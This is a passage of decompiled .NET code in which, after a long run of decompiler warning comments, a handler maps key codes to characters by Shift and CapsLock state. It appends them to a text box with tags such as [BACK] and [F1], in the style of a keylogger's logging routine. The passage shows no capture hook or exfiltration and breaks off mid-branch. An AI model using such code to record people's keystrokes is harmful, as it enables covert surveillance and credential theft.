		//IL_25d5: Invalid comparison between Unknown and I4
		//IL_25fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_2601: Invalid comparison between Unknown and I4
		//IL_262a: Unknown result type (might be due to invalid IL or missing references)
		//IL_262d: Invalid comparison between Unknown and I4
		//IL_2656: Unknown result type (might be due to invalid IL or missing references)
		//IL_2659: Invalid comparison between Unknown and I4
		//IL_2682: Unknown result type (might be due to invalid IL or missing references)
		//IL_2685: Invalid comparison between Unknown and I4
		//IL_26ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_26b1: Invalid comparison between Unknown and I4
		//IL_26da: Unknown result type (might be due to invalid IL or missing references)
		//IL_26dd: Invalid comparison between Unknown and I4
		//IL_2706: Unknown result type (might be due to invalid IL or missing references)
		//IL_2709: Invalid comparison between Unknown and I4
		//IL_2732: Unknown result type (might be due to invalid IL or missing references)
		//IL_2735: Invalid comparison between Unknown and I4
		//IL_275e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2761: Invalid comparison between Unknown and I4
		//IL_278a: Unknown result type (might be due to invalid IL or missing references)
		//IL_278d: Invalid comparison between Unknown and I4
		//IL_27b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b9: Invalid comparison between Unknown and I4
		//IL_27e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_27e5: Invalid comparison between Unknown and I4
		//IL_280e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2811: Invalid comparison between Unknown and I4
		//IL_283a: Unknown result type (might be due to invalid IL or missing references)
		//IL_283d: Invalid comparison between Unknown and I4
		//IL_2866: Unknown result type (might be due to invalid IL or missing references)
		//IL_2869: Invalid comparison between Unknown and I4
		//IL_28a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_28a2: Invalid comparison between Unknown and I4
		//IL_28d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_28dc: Invalid comparison between Unknown and I4
		//IL_2905: Unknown result type (might be due to invalid IL or missing references)
		//IL_2908: Invalid comparison between Unknown and I4
		//IL_2931: Unknown result type (might be due to invalid IL or missing references)
		//IL_2934: Invalid comparison between Unknown and I4
		//IL_295d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2960: Invalid comparison between Unknown and I4
		//IL_2989: Unknown result type (might be due to invalid IL or missing references)
		//IL_298c: Invalid comparison between Unknown and I4
		//IL_29b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_29b8: Invalid comparison between Unknown and I4
		//IL_29e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_29e4: Invalid comparison between Unknown and I4
		//IL_2a0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a10: Invalid comparison between Unknown and I4
		//IL_2a39: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a3c: Invalid comparison between Unknown and I4
		//IL_2a65: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a68: Invalid comparison between Unknown and I4
		//IL_2a91: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a94: Invalid comparison between Unknown and I4
		//IL_2abd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ac0: Invalid comparison between Unknown and I4
		//IL_2b13: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b16: Invalid comparison between Unknown and I4
		//IL_2b3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b42: Invalid comparison between Unknown and I4
		//IL_2b6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b6e: Invalid comparison between Unknown and I4
		//IL_2b97: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b9a: Invalid comparison between Unknown and I4
		//IL_2bc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bc6: Invalid comparison between Unknown and I4
		//IL_2bef: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bf2: Invalid comparison between Unknown and I4
		//IL_2c1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c1e: Invalid comparison between Unknown and I4
		//IL_2c47: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c4a: Invalid comparison between Unknown and I4
		//IL_2c73: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c76: Invalid comparison between Unknown and I4
		//IL_2c9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ca2: Invalid comparison between Unknown and I4
		//IL_2ccb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cce: Invalid comparison between Unknown and I4
		//IL_2cf7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cfa: Invalid comparison between Unknown and I4
		//IL_2d23: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d26: Invalid comparison between Unknown and I4
		//IL_2d4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d52: Invalid comparison between Unknown and I4
		//IL_2d7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d7e: Invalid comparison between Unknown and I4
		//IL_2da7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2daa: Invalid comparison between Unknown and I4
		//IL_2dd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dd6: Invalid comparison between Unknown and I4
		//IL_2dff: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e02: Invalid comparison between Unknown and I4
		//IL_2e2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e2e: Invalid comparison between Unknown and I4
		//IL_2e57: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e5a: Invalid comparison between Unknown and I4
		//IL_2e83: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e86: Invalid comparison between Unknown and I4
		//IL_2eaf: Unknown result type (might be due to invalid IL or missing references)
		//IL_2eb2: Invalid comparison between Unknown and I4
		//IL_2edb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ede: Invalid comparison between Unknown and I4
		//IL_2f07: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f0a: Invalid comparison between Unknown and I4
		//IL_2f33: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f36: Invalid comparison between Unknown and I4
		//IL_2f5f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f62: Invalid comparison between Unknown and I4
		//IL_2f8b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f8e: Invalid comparison between Unknown and I4
		//IL_2fb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fba: Invalid comparison between Unknown and I4
		//IL_2fe3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fe6: Invalid comparison between Unknown and I4
		//IL_300f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3012: Invalid comparison between Unknown and I4
		//IL_303b: Unknown result type (might be due to invalid IL or missing references)
		//IL_303e: Invalid comparison between Unknown and I4
		//IL_3067: Unknown result type (might be due to invalid IL or missing references)
		//IL_306a: Invalid comparison between Unknown and I4
		//IL_3093: Unknown result type (might be due to invalid IL or missing references)
		//IL_3096: Invalid comparison between Unknown and I4
		//IL_30bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_30c2: Invalid comparison between Unknown and I4
		//IL_30eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_30ee: Invalid comparison between Unknown and I4
		//IL_3117: Unknown result type (might be due to invalid IL or missing references)
		//IL_311a: Invalid comparison between Unknown and I4
		//IL_3143: Unknown result type (might be due to invalid IL or missing references)
		//IL_3149: Invalid comparison between Unknown and I4
		//IL_3172: Unknown result type (might be due to invalid IL or missing references)
		//IL_3178: Invalid comparison between Unknown and I4
		//IL_31a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_31a7: Invalid comparison between Unknown and I4
		//IL_31d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_31d6: Invalid comparison between Unknown and I4
		//IL_31ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_3205: Invalid comparison between Unknown and I4
		//IL_322e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3234: Invalid comparison between Unknown and I4
		//IL_325d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3263: Invalid comparison between Unknown and I4
		//IL_328c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3292: Invalid comparison between Unknown and I4
		//IL_32bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_32c1: Invalid comparison between Unknown and I4
		//IL_32ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_32f0: Invalid comparison between Unknown and I4
		//IL_3319: Unknown result type (might be due to invalid IL or missing references)
		//IL_331c: Invalid comparison between Unknown and I4
		//IL_3345: Unknown result type (might be due to invalid IL or missing references)
		//IL_3348: Invalid comparison between Unknown and I4
		//IL_3371: Unknown result type (might be due to invalid IL or missing references)
		//IL_3374: Invalid comparison between Unknown and I4
		//IL_339d: Unknown result type (might be due to invalid IL or missing references)
		//IL_33a0: Invalid comparison between Unknown and I4
		//IL_33c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_33cc: Invalid comparison between Unknown and I4
		//IL_33f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_33f8: Invalid comparison between Unknown and I4
		//IL_3421: Unknown result type (might be due to invalid IL or missing references)
		//IL_3424: Invalid comparison between Unknown and I4
		//IL_344d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3450: Invalid comparison between Unknown and I4
		//IL_3479: Unknown result type (might be due to invalid IL or missing references)
		//IL_347c: Invalid comparison between Unknown and I4
		//IL_34a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_34a8: Invalid comparison between Unknown and I4
		//IL_34d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_34d4: Invalid comparison between Unknown and I4
		//IL_34fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_3500: Invalid comparison between Unknown and I4
		//IL_3529: Unknown result type (might be due to invalid IL or missing references)
		//IL_352c: Invalid comparison between Unknown and I4
		//IL_3555: Unknown result type (might be due to invalid IL or missing references)
		//IL_3558: Invalid comparison between Unknown and I4
		//IL_3581: Unknown result type (might be due to invalid IL or missing references)
		//IL_3584: Invalid comparison between Unknown and I4
		//IL_35bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_35bd: Invalid comparison between Unknown and I4
		//IL_35f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_35f7: Invalid comparison between Unknown and I4
		//IL_3620: Unknown result type (might be due to invalid IL or missing references)
		//IL_3623: Invalid comparison between Unknown and I4
		//IL_364c: Unknown result type (might be due to invalid IL or missing references)
		//IL_364f: Invalid comparison between Unknown and I4
		//IL_3678: Unknown result type (might be due to invalid IL or missing references)
		//IL_367b: Invalid comparison between Unknown and I4
		//IL_36a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_36a7: Invalid comparison between Unknown and I4
		//IL_36d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_36d3: Invalid comparison between Unknown and I4
		//IL_36fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_36ff: Invalid comparison between Unknown and I4
		//IL_3728: Unknown result type (might be due to invalid IL or missing references)
		//IL_372b: Invalid comparison between Unknown and I4
		//IL_3754: Unknown result type (might be due to invalid IL or missing references)
		//IL_3757: Invalid comparison between Unknown and I4
		//IL_3780: Unknown result type (might be due to invalid IL or missing references)
		//IL_3783: Invalid comparison between Unknown and I4
		//IL_37ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_37af: Invalid comparison between Unknown and I4
		//IL_37d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_37db: Invalid comparison between Unknown and I4
		//IL_382e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3831: Invalid comparison between Unknown and I4
		//IL_385a: Unknown result type (might be due to invalid IL or missing references)
		//IL_385d: Invalid comparison between Unknown and I4
		//IL_3886: Unknown result type (might be due to invalid IL or missing references)
		//IL_3889: Invalid comparison between Unknown and I4
		//IL_38b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_38b5: Invalid comparison between Unknown and I4
		//IL_38de: Unknown result type (might be due to invalid IL or missing references)
		//IL_38e1: Invalid comparison between Unknown and I4
		//IL_390a: Unknown result type (might be due to invalid IL or missing references)
		//IL_390d: Invalid comparison between Unknown and I4
		//IL_3936: Unknown result type (might be due to invalid IL or missing references)
		//IL_3939: Invalid comparison between Unknown and I4
		//IL_3962: Unknown result type (might be due to invalid IL or missing references)
		//IL_3965: Invalid comparison between Unknown and I4
		//IL_398e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3991: Invalid comparison between Unknown and I4
		//IL_39ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_39bd: Invalid comparison between Unknown and I4
		//IL_39e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_39e9: Invalid comparison between Unknown and I4
		//IL_3a12: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a15: Invalid comparison between Unknown and I4
		//IL_3a3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a41: Invalid comparison between Unknown and I4
		//IL_3a6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a6d: Invalid comparison between Unknown and I4
		//IL_3a96: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a99: Invalid comparison between Unknown and I4
		//IL_3ac2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ac5: Invalid comparison between Unknown and I4
		//IL_3aee: Unknown result type (might be due to invalid IL or missing references)
		//IL_3af1: Invalid comparison between Unknown and I4
		//IL_3b1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b1d: Invalid comparison between Unknown and I4
		//IL_3b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b49: Invalid comparison between Unknown and I4
		//IL_3b72: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b75: Invalid comparison between Unknown and I4
		//IL_3b9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ba1: Invalid comparison between Unknown and I4
		//IL_3bca: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bcd: Invalid comparison between Unknown and I4
		//IL_3bf6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bf9: Invalid comparison between Unknown and I4
		//IL_3c22: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c25: Invalid comparison between Unknown and I4
		//IL_3c4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c51: Invalid comparison between Unknown and I4
		//IL_3c7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c7d: Invalid comparison between Unknown and I4
		//IL_3ca6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ca9: Invalid comparison between Unknown and I4
		//IL_3cd2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cd5: Invalid comparison between Unknown and I4
		//IL_3cfe: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d01: Invalid comparison between Unknown and I4
		//IL_3d2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d2d: Invalid comparison between Unknown and I4
		//IL_3d56: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d59: Invalid comparison between Unknown and I4
		//IL_3d82: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d85: Invalid comparison between Unknown and I4
		//IL_3dae: Unknown result type (might be due to invalid IL or missing references)
		//IL_3db1: Invalid comparison between Unknown and I4
		//IL_3dda: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ddd: Invalid comparison between Unknown and I4
		//IL_3e06: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e09: Invalid comparison between Unknown and I4
		//IL_3e32: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e35: Invalid comparison between Unknown and I4
		//IL_3e5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e64: Invalid comparison between Unknown and I4
		//IL_3e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e93: Invalid comparison between Unknown and I4
		//IL_3ebc: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ec2: Invalid comparison between Unknown and I4
		//IL_3eeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ef1: Invalid comparison between Unknown and I4
		//IL_3f1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f20: Invalid comparison between Unknown and I4
		//IL_3f49: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f4f: Invalid comparison between Unknown and I4
		//IL_3f78: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f7e: Invalid comparison between Unknown and I4
		//IL_3fa7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fad: Invalid comparison between Unknown and I4
		//IL_3fd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fdc: Invalid comparison between Unknown and I4
		//IL_4005: Unknown result type (might be due to invalid IL or missing references)
		//IL_4008: Invalid comparison between Unknown and I4
		//IL_4031: Unknown result type (might be due to invalid IL or missing references)
		//IL_4034: Invalid comparison between Unknown and I4
		//IL_405d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4060: Invalid comparison between Unknown and I4
		//IL_4089: Unknown result type (might be due to invalid IL or missing references)
		//IL_408c: Invalid comparison between Unknown and I4
		//IL_40b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_40b8: Invalid comparison between Unknown and I4
		//IL_40e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_40e4: Invalid comparison between Unknown and I4
		//IL_410d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4110: Invalid comparison between Unknown and I4
		//IL_4139: Unknown result type (might be due to invalid IL or missing references)
		//IL_413c: Invalid comparison between Unknown and I4
		//IL_4165: Unknown result type (might be due to invalid IL or missing references)
		//IL_4168: Invalid comparison between Unknown and I4
		//IL_4191: Unknown result type (might be due to invalid IL or missing references)
		//IL_4194: Invalid comparison between Unknown and I4
		//IL_41bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_41c0: Invalid comparison between Unknown and I4
		//IL_41e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_41ec: Invalid comparison between Unknown and I4
		//IL_4215: Unknown result type (might be due to invalid IL or missing references)
		//IL_4218: Invalid comparison between Unknown and I4
		//IL_4241: Unknown result type (might be due to invalid IL or missing references)
		//IL_4244: Invalid comparison between Unknown and I4
		//IL_426d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4270: Invalid comparison between Unknown and I4
		//IL_42a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_42a9: Invalid comparison between Unknown and I4
		//IL_42e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_42e3: Invalid comparison between Unknown and I4
		//IL_430c: Unknown result type (might be due to invalid IL or missing references)
		//IL_430f: Invalid comparison between Unknown and I4
		//IL_4338: Unknown result type (might be due to invalid IL or missing references)
		//IL_433b: Invalid comparison between Unknown and I4
		//IL_4364: Unknown result type (might be due to invalid IL or missing references)
		//IL_4367: Invalid comparison between Unknown and I4
		//IL_4390: Unknown result type (might be due to invalid IL or missing references)
		//IL_4393: Invalid comparison between Unknown and I4
		//IL_43bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_43bf: Invalid comparison between Unknown and I4
		//IL_43e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_43eb: Invalid comparison between Unknown and I4
		//IL_4414: Unknown result type (might be due to invalid IL or missing references)
		//IL_4417: Invalid comparison between Unknown and I4
		//IL_4440: Unknown result type (might be due to invalid IL or missing references)
		//IL_4443: Invalid comparison between Unknown and I4
		//IL_446c: Unknown result type (might be due to invalid IL or missing references)
		//IL_446f: Invalid comparison between Unknown and I4
		//IL_4495: Unknown result type (might be due to invalid IL or missing references)
		//IL_4498: Invalid comparison between Unknown and I4
		//IL_44be: Unknown result type (might be due to invalid IL or missing references)
		//IL_44c1: Invalid comparison between Unknown and I4
		//IL_44e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_44ed: Invalid comparison between Unknown and I4
		if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[BACK]");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
